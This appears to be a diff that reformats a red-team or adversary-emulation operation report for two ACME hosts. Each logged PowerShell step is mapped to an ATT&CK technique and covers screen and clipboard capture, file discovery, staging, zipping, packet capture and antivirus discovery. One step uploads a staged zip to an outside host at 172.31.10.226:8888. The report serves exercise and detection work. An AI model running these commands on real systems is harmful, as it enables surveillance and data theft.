+**Command:** `New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object`
 
-  Start: 2024-09-13T18:25:41Z
+**Description:** create a directory for exfil staging
 
-  Command: 
-```powershell
-Get-ChildItem C:\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
-```
+**Technique:** Data Staged: Local Data Staging
 
+**ATT&CK:** [T1074.001](https://attack.mitre.org/techniques/T1074/001)
 
-###   Description: Locate files deemed sensitive
+**Status:** `Success`
 
+**PID:** 8676
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}
+**Time:** 2024-09-13T18:24:02Z → N/A
 
-  Status: Success
 
-  PID: 9144
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-  Start: 2024-09-13T18:26:49Z
+**Command:** `Get-ChildItem C:\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;`
 
-  Command: 
-```powershell
-Get-ChildItem C:\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
-```
+**Description:** Locate files deemed sensitive
 
+**Technique:** Data from Local System
 
-###   Description: copy files to staging directory
+**ATT&CK:** [T1005](https://attack.mitre.org/techniques/T1005)
 
+**Status:** `Success`
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}
+**PID:** 6552
 
-  Status: Success
+**Time:** 2024-09-13T18:25:06Z → N/A
 
-  PID: 5320
 
-  Start: 2024-09-13T18:27:46Z
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-  Command: 
-```powershell
-Copy-Item C:\Users\grantj\.conda\pkgs\ipykernel-6.26.0-pyha63f2e9_0\share\jupyter\kernels\python3\logo-64x64.png C:\Windows\system32\staged
-```
+**Command:** `Get-ChildItem C:\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;`
 
+**Description:** Locate files deemed sensitive
 
-###   Description: copy files to staging directory
+**Technique:** Data from Local System
 
+**ATT&CK:** [T1005](https://attack.mitre.org/techniques/T1005)
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}
+**Status:** `Success`
 
-  Status: Success
+**PID:** 6360
 
-  PID: 5888
+**Time:** 2024-09-13T18:25:41Z → N/A
 
-  Start: 2024-09-13T18:28:47Z
 
-  Command: 
-```powershell
-Copy-Item C:\Users\grantj\.conda\pkgs\ipykernel-6.26.0-pyha63f2e9_0\share\jupyter\kernels\python3\logo-32x32.png C:\Windows\system32\staged
-```
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
+**Command:** `Get-ChildItem C:\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;`
 
-###   Description: copy files to staging directory
+**Description:** Locate files deemed sensitive
 
+**Technique:** Data from Local System
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}
+**ATT&CK:** [T1005](https://attack.mitre.org/techniques/T1005)
 
-  Status: Success
+**Status:** `Success`
 
-  PID: 8424
+**PID:** 9144
 
-  Start: 2024-09-13T18:29:46Z
+**Time:** 2024-09-13T18:26:49Z → N/A
 
-  Command: 
-```powershell
-Copy-Item C:\Users\grantj\.conda\pkgs\ipython-8.17.2-pyh5737063_0\site-packages\IPython\lib\tests\test.wav C:\Windows\system32\staged
-```
 
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-###   Description: Compress a directory on the file system
+**Command:** `Copy-Item C:\Users\grantj\.conda\pkgs\ipykernel-6.26.0-pyha63f2e9_0\share\jupyter\kernels\python3\logo-64x64.png C:\Windows\system32\staged`
 
+**Description:** copy files to staging directory
 
-  Attack: {'tactic': 'exfiltration', 'technique_name': 'Archive Collected Data: Archive via Utility', 'technique_id': 'T1560.001'}
+**Technique:** Data Staged: Local Data Staging
 
-  Status: Success
+**ATT&CK:** [T1074.001](https://attack.mitre.org/techniques/T1074/001)
 
-  PID: 8848
+**Status:** `Success`
 
-  Start: 2024-09-13T18:30:34Z
+**PID:** 5320
 
-  Command: 
-```powershell
-Compress-Archive -Path C:\Windows\system32\staged -DestinationPath C:\Windows\system32\staged.zip -Force;sleep 1; ls C:\Windows\system32\staged.zip | foreach {$_.FullName} | select
-```
+**Time:** 2024-09-13T18:27:46Z → N/A
 
 
-###   Description: Exfil the staged directory
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
+**Command:** `Copy-Item C:\Users\grantj\.conda\pkgs\ipykernel-6.26.0-pyha63f2e9_0\share\jupyter\kernels\python3\logo-32x32.png C:\Windows\system32\staged`
 
-  Attack: {'tactic': 'exfiltration', 'technique_name': 'Exfiltration Over C2 Channel', 'technique_id': 'T1041'}
+**Description:** copy files to staging directory
 
-  Status: Success
+**Technique:** Data Staged: Local Data Staging
 
-  PID: 8132
+**ATT&CK:** [T1074.001](https://attack.mitre.org/techniques/T1074/001)
 
-  Start: 2024-09-13T18:31:31Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-$ErrorActionPreference = 'Stop';$fieldName = "C:\Windows\system32\staged.zip";$filePath = "C:\Windows\system32\staged.zip";$url = "http://172.31.10.226:8888/file/upload";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-hkrmxr');$client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();
-```
+**PID:** 5888
 
+**Time:** 2024-09-13T18:28:47Z → N/A
 
-###   Description: Identify AV
 
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}
+**Command:** `Copy-Item C:\Users\grantj\.conda\pkgs\ipython-8.17.2-pyh5737063_0\site-packages\IPython\lib\tests\test.wav C:\Windows\system32\staged`
 
-  Status: Failed
+**Description:** copy files to staging directory
 
-  PID: 268
+**Technique:** Data Staged: Local Data Staging
 
-  Start: 2024-09-13T18:33:02Z
+**ATT&CK:** [T1074.001](https://attack.mitre.org/techniques/T1074/001)
 
-  Command: 
-```powershell
-wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
-```
+**Status:** `Success`
 
+**PID:** 8424
 
-###   Description: View all potential WIFI networks on host
+**Time:** 2024-09-13T18:29:46Z → N/A
 
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-  Status: Failed
+**Command:** `Compress-Archive -Path C:\Windows\system32\staged -DestinationPath C:\Windows\system32\staged.zip -Force;sleep 1; ls C:\Windows\system32\staged.zip | foreach {$_.FullName} | select`
 
-  PID: 5248
+**Description:** Compress a directory on the file system
 
-  Start: 2024-09-13T18:33:36Z
+**Technique:** Archive Collected Data: Archive via Utility
 
-  Command: 
-```powershell
-.\obfuscated_payload.ps1 -Scan
-```
+**ATT&CK:** [T1560.001](https://attack.mitre.org/techniques/T1560/001)
 
+**Status:** `Success`
 
-###   Description: See the most used WIFI networks of a machine
+**PID:** 8848
 
+**Time:** 2024-09-13T18:30:34Z → N/A
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}
 
-  Status: Success
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-  PID: 740
+**Command:** `$ErrorActionPreference = 'Stop';$fieldName = "C:\Windows\system32\staged.zip";$filePath = "C:\Windows\system32\staged.zip";$url = "http://172.31.10.226:8888/file/upload";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-hkrmxr');$client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();`
 
-  Start: 2024-09-13T18:34:14Z
+**Description:** Exfil the staged directory
 
-  Command: 
-```powershell
-.\wifi.ps1 -Pref
-```
+**Technique:** Exfiltration Over C2 Channel
 
+**ATT&CK:** [T1041](https://attack.mitre.org/techniques/T1041)
 
-###   Description: Perform a packet capture
+**Status:** `Success`
 
+**PID:** 8132
 
-  Attack: {'tactic': 'credential-access', 'technique_name': 'Network Sniffing', 'technique_id': 'T1040'}
+**Time:** 2024-09-13T18:31:31Z → N/A
 
-  Status: Success
 
-  PID: 6924
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-  Start: 2024-09-13T18:36:23Z
+**Command:** `wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value`
 
-  Command: 
-```powershell
-$path = "$ENV:UserProfile\Desktop\pcap.etl";New-NetEventSession -Name "PCAP" -CaptureMode SaveToFile -LocalFilePath $path;Add-NetEventProvider -Name "Microsoft-Windows-TCPIP" -SessionName "PCAP";Start-NetEventSession -Name "PCAP";Start-Sleep -s 60;Stop-NetEventSession -Name "PCAP";if (Test-Path $path) {  echo $path;  exit 0;} else {  echo "Failed to generate PCAP file.";  exit 1;};
-```
+**Description:** Identify AV
 
+**Technique:** Software Discovery: Security Software Discovery
 
-## Host: ACME-HH-ESO (paw: nowkww)
+**ATT&CK:** [T1518.001](https://attack.mitre.org/techniques/T1518/001)
 
-###   Description: capture the contents of the screen
+**Status:** `Failed`
 
+**PID:** 268
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Screen Capture', 'technique_id': 'T1113'}
+**Time:** 2024-09-13T18:33:02Z → N/A
 
-  Status: Success
 
-  PID: 4844
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-  Start: 2024-09-13T18:22:20Z
+**Command:** `.\obfuscated_payload.ps1 -Scan`
 
-  Command: 
-```powershell
-$loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = "$HOME\Desktop\screenshot.png";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;
-```
+**Description:** View all potential WIFI networks on host
 
+**Technique:** System Network Configuration Discovery
 
-###   Description: copy the contents for the clipboard and print them
+**ATT&CK:** [T1016](https://attack.mitre.org/techniques/T1016)
 
+**Status:** `Failed`
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Clipboard Data', 'technique_id': 'T1115'}
+**PID:** 5248
 
-  Status: Success
+**Time:** 2024-09-13T18:33:36Z → N/A
 
-  PID: 2356
 
-  Start: 2024-09-13T18:23:22Z
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-  Command: 
-```powershell
-Get-Clipboard -raw
-```
+**Command:** `.\wifi.ps1 -Pref`
 
+**Description:** See the most used WIFI networks of a machine
 
-###   Description: create a directory for exfil staging
+**Technique:** System Network Configuration Discovery
 
+**ATT&CK:** [T1016](https://attack.mitre.org/techniques/T1016)
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data Staged: Local Data Staging', 'technique_id': 'T1074.001'}
+**Status:** `Success`
 
-  Status: Success
+**PID:** 740
 
-  PID: 10080
+**Time:** 2024-09-13T18:34:14Z → N/A
 
-  Start: 2024-09-13T18:24:18Z
 
-  Command: 
-```powershell
-New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object
-```
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
+**Command:** `$path = "$ENV:UserProfile\Desktop\pcap.etl";New-NetEventSession -Name "PCAP" -CaptureMode SaveToFile -LocalFilePath $path;Add-NetEventProvider -Name "Microsoft-Windows-TCPIP" -SessionName "PCAP";Start-NetEventSession -Name "PCAP";Start-Sleep -s 60;Stop-NetEventSession -Name "PCAP";if (Test-Path $path) {  echo $path;  exit 0;} else {  echo "Failed to generate PCAP file.";  exit 1;};`
 
-###   Description: Locate files deemed sensitive
+**Description:** Perform a packet capture
 
+**Technique:** Network Sniffing
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}
+**ATT&CK:** [T1040](https://attack.mitre.org/techniques/T1040)
 
-  Status: Success
+**Status:** `Success`
 
-  PID: 4820
+**PID:** 6924
 
-  Start: 2024-09-13T18:25:12Z
+**Time:** 2024-09-13T18:36:23Z → N/A
 
-  Command: 
-```powershell
-Get-ChildItem C:\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
-```
 
+**[STEP] ACME-HH-ESO (nowkww)**
 
-###   Description: Locate files deemed sensitive
+**Command:** `$loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);  $dest = "$HOME\Desktop\screenshot.png";  screenshot $bounds $dest;  if (Test-Path -Path $dest) {    $dest;    exit 0;  };};exit 1;`
 
+**Description:** capture the contents of the screen
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}
+**Technique:** Screen Capture
 
-  Status: Success
+**ATT&CK:** [T1113](https://attack.mitre.org/techniques/T1113)
 
-  PID: 7636
+**Status:** `Success`
 
-  Start: 2024-09-13T18:25:56Z
+**PID:** 4844
 
-  Command: 
-```powershell
-Get-ChildItem C:\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
-```
+**Time:** 2024-09-13T18:22:20Z → N/A
 
 
-###   Description: Locate files deemed sensitive
+**[STEP] ACME-HH-ESO (nowkww)**
 
+**Command:** `Get-Clipboard -raw`
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Data from Local System', 'technique_id': 'T1005'}
+**Description:** copy the contents for the clipboard and print them
 
-  Status: Success
+**Technique:** Clipboard Data
 
-  PID: 1716
+**ATT&CK:** [T1115](https://attack.mitre.org/techniques/T1115)
 
-  Start: 2024-09-13T18:26:47Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-Get-ChildItem C:\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;
-```
+**PID:** 2356
 
+**Time:** 2024-09-13T18:23:22Z → N/A
 
-###   Description: Compress a directory on the file system
 
+**[STEP] ACME-HH-ESO (nowkww)**
 
-  Attack: {'tactic': 'exfiltration', 'technique_name': 'Archive Collected Data: Archive via Utility', 'technique_id': 'T1560.001'}
+**Command:** `New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object`
 
-  Status: Failed
+**Description:** create a directory for exfil staging
 
-  PID: 3200
+**Technique:** Data Staged: Local Data Staging
 
-  Start: 2024-09-13T18:27:32Z
+**ATT&CK:** [T1074.001](https://attack.mitre.org/techniques/T1074/001)
 
-  Command: 
-```powershell
-Compress-Archive -Path C:\Users\grantj\staged -DestinationPath C:\Users\grantj\staged.zip -Force;sleep 1; ls C:\Users\grantj\staged.zip | foreach {$_.FullName} | select
-```
+**Status:** `Success`
 
+**PID:** 10080
 
-###   Description: Identify AV
+**Time:** 2024-09-13T18:24:18Z → N/A
 
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}
+**[STEP] ACME-HH-ESO (nowkww)**
 
-  Status: Failed
+**Command:** `Get-ChildItem C:\Users -Recurse -Include *.wav -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;`
 
-  PID: 1096
+**Description:** Locate files deemed sensitive
 
-  Start: 2024-09-13T18:28:13Z
+**Technique:** Data from Local System
 
-  Command: 
-```powershell
-wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
-```
+**ATT&CK:** [T1005](https://attack.mitre.org/techniques/T1005)
 
+**Status:** `Success`
 
-###   Description: View all potential WIFI networks on host
+**PID:** 4820
 
+**Time:** 2024-09-13T18:25:12Z → N/A
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}
 
-  Status: Failed
+**[STEP] ACME-HH-ESO (nowkww)**
 
-  PID: 5000
+**Command:** `Get-ChildItem C:\Users -Recurse -Include *.png -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;`
 
-  Start: 2024-09-13T18:29:20Z
+**Description:** Locate files deemed sensitive
 
-  Command: 
-```powershell
-.\obfuscated_payload.ps1 -Scan
-```
+**Technique:** Data from Local System
 
+**ATT&CK:** [T1005](https://attack.mitre.org/techniques/T1005)
 
-###   Description: See the most used WIFI networks of a machine
+**Status:** `Success`
 
+**PID:** 7636
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'System Network Configuration Discovery', 'technique_id': 'T1016'}
+**Time:** 2024-09-13T18:25:56Z → N/A
 
-  Status: Success
 
-  PID: 7516
+**[STEP] ACME-HH-ESO (nowkww)**
 
-  Start: 2024-09-13T18:30:13Z
+**Command:** `Get-ChildItem C:\Users -Recurse -Include *.yml -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;exit 0;`
 
-  Command: 
-```powershell
-.\wifi.ps1 -Pref
-```
+**Description:** Locate files deemed sensitive
 
+**Technique:** Data from Local System
+
+**ATT&CK:** [T1005](https://attack.mitre.org/techniques/T1005)
+
+**Status:** `Success`
+
+**PID:** 1716
+
+**Time:** 2024-09-13T18:26:47Z → N/A
+
+
+**[STEP] ACME-HH-ESO (nowkww)**
+
+**Command:** `Compress-Archive -Path C:\Users\grantj\staged -DestinationPath C:\Users\grantj\staged.zip -Force;sleep 1; ls C:\Users\grantj\staged.zip | foreach {$_.FullName} | select`
+
+**Description:** Compress a directory on the file system
+
+**Technique:** Archive Collected Data: Archive via Utility
+
+**ATT&CK:** [T1560.001](https://attack.mitre.org/techniques/T1560/001)
+
+**Status:** `Failed`
+
+**PID:** 3200
+
+**Time:** 2024-09-13T18:27:32Z → N/A
+
+
+**[STEP] ACME-HH-ESO (nowkww)**
+
+**Command:** `wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value`
+
+**Description:** Identify AV
+
+**Technique:** Software Discovery: Security Software Discovery
+
+**ATT&CK:** [T1518.001](https://attack.mitre.org/techniques/T1518/001)
+
+**Status:** `Failed`
+
+**PID:** 1096
+
+**Time:** 2024-09-13T18:28:13Z → N/A
+
+
+**[STEP] ACME-HH-ESO (nowkww)**
+
+**Command:** `.\obfuscated_payload.ps1 -Scan`
+
+**Description:** View all potential WIFI networks on host
+
+**Technique:** System Network Configuration Discovery
+
+**ATT&CK:** [T1016](https://attack.mitre.org/techniques/T1016)
+
+**Status:** `Failed`
+
+**PID:** 5000
+
+**Time:** 2024-09-13T18:29:20Z → N/A
+
+
+**[STEP] ACME-HH-ESO (nowkww)**
+
+**Command:** `.\wifi.ps1 -Pref`
+
+**Description:** See the most used WIFI networks of a machine
+
+**Technique:** System Network Configuration Discovery
+
+**ATT&CK:** [T1016](https://attack.mitre.org/techniques/T1016)
+
+**Status:** `Success`
+
+**PID:** 7516
+
+**Time:** 2024-09-13T18:30:13Z → N/A
+
+
+![Operation Graph](super_spy_graph.png)
